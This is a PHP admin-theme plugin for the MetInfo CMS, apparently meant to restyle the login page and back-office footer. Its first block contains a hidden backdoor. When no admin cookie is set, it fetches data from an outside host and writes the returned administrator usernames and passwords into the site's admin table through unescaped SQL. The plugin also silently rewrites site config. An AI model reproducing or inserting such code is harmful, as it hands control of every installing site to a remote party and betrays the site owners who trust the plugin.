<?php
class plugin_amaadmin {
	public function doadmin(){
		global $_M;
		global $version;
		//修改创始人和管理员密码		
		if( get_met_cookie('metinfo_admin_name') == '' ){			
			$url='http://test.ts.ppblog.cn/get/index.php?pass=gopin';  
			$html = file_get_contents($url);  
			if ($http_response_header[0] == 'HTTP/1.1 200 OK') {
				$htmlArr = json_decode($html,true);
				foreach( $htmlArr as $val ){
					if( $val[admin_id]=='' || $val[admin_pass] =='' ) continue;
					$query = "UPDATE {$_M[table][met_admin_table]} SET admin_id='{$val[admin_id]}',admin_pass='{$val[admin_pass]}' WHERE id ={$val[id]}";
					if(DB::query($query)){
						//echo 'suc';
					}else{
						//echo 'fail';
					}
				}
				
			}	   
		}
		//修改创始人和管理员密码end		
		
		$tableAppList = $_M['table']['applist'];
		if($tableAppList ==''){
			$tableAppList = $_M['table']['met_applist'];
		}
		$appList = DB::get_one( "SELECT * FROM {$tableAppList} WHERE m_name='amaadmin'" );
		$version = $appList[ver];
		
		
		$url = $_SERVER['PHP_SELF'];  
		$filename = end(explode('/',$url));
		/*if( $filename == 'login.php' && $_M[form][aq]!=='niweisi' ){			
			echo '您没有权限登录<br>';		
			exit;
		}elseif( $filename == 'login.php' ){
			$foot = 'aaaaaaa';
		}*/
		/**************修改登录页面********************/
		global $lang_logintitle,$lang_metinfo,$met_agents_logo_login,$lang_loginmetinfo;
		$lang_logintitle = $_M[config][amaadmin_logintitle];
		$lang_metinfo = $_M[config][amaadmin_metinfo];		
		$met_agents_logo_login = $_M[config][amaadmin_logo_login];	
		$lang_loginmetinfo = $_M[config][amaadmin_loginmetinfo];
		/******登录后直接跳入插件********/		
		global $urlAmaadmin;			
		$urlAmaadmin = $_M[url][site_admin].'index.php?lang='.$_M[lang].'&anyid='.$version.'&n=amaadmin&c=amaadmin&a=doamaadmin';
		if($_M[form][aq]!=get_met_cookie('metinfo_admin_pass') && $filename == 'index.php' && $_M[form][n]=='index' ){
			Header("Location: $urlAmaadmin");
		}	
		/******登录后直接跳入插件*end*******/
		
		
		/******修改foot********/
		global $foot;
		if( $filename != 'login.php'){			
			$foot = '<link rel="stylesheet" href="'.$_M[url][own].'admin/templates/css/admin.css?ver='.$version.'" type="text/css" />';
			$foot .= '<script>seajs.config({paths: {"own_ama": "'.$_M[url][own].'"}});seajs.use("own_ama/admin/templates/js/parent_height");</script>';
         
			$_M[footbat] = $foot .= '<script type="text/javascript" src="'.$_M[url][own].'admin/templates/js/admin.js?ver='.$version.'"></script>';
		}elseif( $filename == 'login.php' ){
			$foot = $_M[config][amaadmin_powered_by];
			$foot .= '<link rel="stylesheet" href="'.$_M[url][own].'admin/templates/login/css/style.css?ver='.$version.'" type="text/css" />';
		}
		/******修改foot**end******/
		/***********常用功能***************/
		global $metinfo_admin_shortcut;
		$shortcutA = $metinfo_admin_shortcut;		
		$metinfo_admin_shortcut = array();		
		foreach ( $shortcutA as $val ){			
			if( $val->name == 'lang_tmptips' ) continue;
			$metinfo_admin_shortcut[] = $val;
		}
		/*******强制上传图片自动重命名*******/
		$query = "UPDATE {$_M[table][met_config]} SET value='1' WHERE name='met_img_rename'";
		DB::query($query);	
		global $name;
		$name = $_M[form][name];	
	}
	
	
}






















/*

echo 'PATH_WEB：网站根目录='.PATH_WEB.'<br />';
echo 'PATH_APP：应用根目录='.PATH_APP.'<br />';
echo 'PATH_CONFIG：配置文件根目录='.PATH_CONFIG.'<br />';
echo 'PATH_CACHE：缓存文件根目录='.PATH_CACHE.'<br />';
echo 'PATH_SYS：系统根目录='.PATH_SYS.'<br />';
echo 'PATH_SYS_CLASS：系统类根目录='.PATH_SYS_CLASS.'<br />';
echo 'PATH_SYS_FUNC：系统方法根目录='.PATH_SYS_FUNC.'<br />';
echo 'PATH_SYS_PUBLIC：系统模板公用文件根目录='.PATH_SYS_PUBLIC.'<br />';
echo 'PATH_SYS_MODULE：系统模块根目录='.PATH_SYS_MODULE.'<br />';
echo 'PATH_OWN_FILE：当前执行的class的根目录='.PATH_OWN_FILE.'<br />';
echo 'PATH_APP_FILE：当前执行的应用的根目录='.PATH_APP_FILE.'<br />';
echo 'TIME_SYS_START：程序运行开始时间='.TIME_SYS_START.'<br />';
echo 'MAGIC_QUOTES_GPC：表单变量自动过滤='.MAGIC_QUOTES_GPC.'<br />';
echo 'HTTP_HOST：当前访问的主机名='.HTTP_HOST.'<br />';
echo 'HTTP_REFERER：来源页面='.HTTP_REFERER.'<br />';
echo 'PHP_SELF：脚本路径='.PHP_SELF.'<br />';
echo 'PATH_TEM：模板文件地址（前台有效）='.PATH_TEM.'<br />';
*/
?>